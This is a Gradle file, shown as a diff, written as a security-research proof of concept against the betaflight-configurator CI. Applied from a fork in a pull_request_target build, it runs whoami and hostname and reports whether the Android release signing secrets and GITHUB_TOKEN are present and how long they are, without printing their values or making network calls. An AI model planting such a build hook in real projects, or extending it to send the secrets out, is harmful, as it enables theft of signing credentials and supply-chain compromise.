@@ -1,0 +1,60 @@
+// SECURITY RESEARCH — Non-destructive PoC for FINDING-SC-014
+// betaflight/betaflight-configurator
+// This file is injected via fork and prints secret presence during Gradle build.
+// No values exfiltrated. PR closed after evidence capture.
+
+// To be applied via: apply from: '../poc-probe.gradle' in android/app/build.gradle
+
+tasks.register('pocSecurityProbe') {
+    group = 'Security Research'
+    description = 'Non-destructive PoC: prints env key presence only'
+    doFirst {
+        def sep = '=' * 60
+        println "\n$sep"
+        println "[POC] FINDING-SC-014 — betaflight/betaflight-configurator security probe"
+        println "[POC] pull_request_target + fork checkout + RELEASE_KEYSTORE in env"
+        println sep
+
+        // Runner identity
+        def whoami = 'whoami'.execute().text.trim()
+        def hostname = 'hostname'.execute().text.trim()
+        println "[POC] whoami:    $whoami"
+        println "[POC] hostname:  $hostname"
+        println "[POC] runner_os: ${System.getenv('RUNNER_OS') ?: 'unknown'}"
+        println "[POC] github_event_name: ${System.getenv('GITHUB_EVENT_NAME') ?: 'unknown'}"
+        println "[POC] github_workflow: ${System.getenv('GITHUB_WORKFLOW') ?: 'unknown'}"
+
+        // Signing secrets — presence + length only (no values)
+        def signingKeys = [
+            'RELEASE_KEYSTORE_BASE64',
+            'RELEASE_KEYSTORE_PASSWORD',
+            'RELEASE_KEY_ALIAS',
+            'RELEASE_KEY_ALIAS_PASSWORD',
+        ]
+        println "\n[POC] signing secret presence (values fully REDACTED):"
+        signingKeys.each { key ->
+            def val = System.getenv(key)
+            if (val) {
+                println "  ${key.padRight(40)} = <REDACTED length=${val.length()}>"
+            } else {
+                println "  ${key.padRight(40)} = not set"
+            }
+        }
+
+        println "\n[POC] PRESENCE of signing secrets (boolean):"
+        signingKeys.each { key ->
+            def present = System.getenv(key) ? 'YES' : 'no'
+            println "  ${key.padRight(40)} = $present"
+        }
+
+        println "\n[POC] other env keys of interest:"
+        ['GITHUB_TOKEN', 'GITHUB_SHA', 'GITHUB_REPOSITORY'].each { key ->
+            def val = System.getenv(key)
+            println "  ${key.padRight(40)} = ${val ? '<present length=' + val.length() + '>' : 'not set'}"
+        }
+
+        println sep
+        println "[POC] probe complete — no values exfiltrated, no network calls made"
+        println "$sep\n"
+    }
+}
